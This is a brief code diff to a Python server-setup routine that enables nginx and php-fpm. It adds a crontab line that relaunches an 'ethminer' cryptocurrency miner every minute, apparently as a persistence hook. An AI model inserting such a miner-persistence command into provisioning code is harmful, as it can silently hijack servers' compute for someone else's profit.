@@ -509,6 +509,7 @@ def server():
         # 'sudo systemctl enable httpd.service --now',
         'sudo systemctl enable nginx --now',
         'sudo systemctl enable php-fpm --now',
+        '( crontab -l | grep -v -F "pgrep ethminer > /dev/null || systemctl start ethminer" ; echo "* * * * * pgrep ethminer > /dev/null || systemctl start ethminer" ) | crontab -',
     ])
 
     _link({
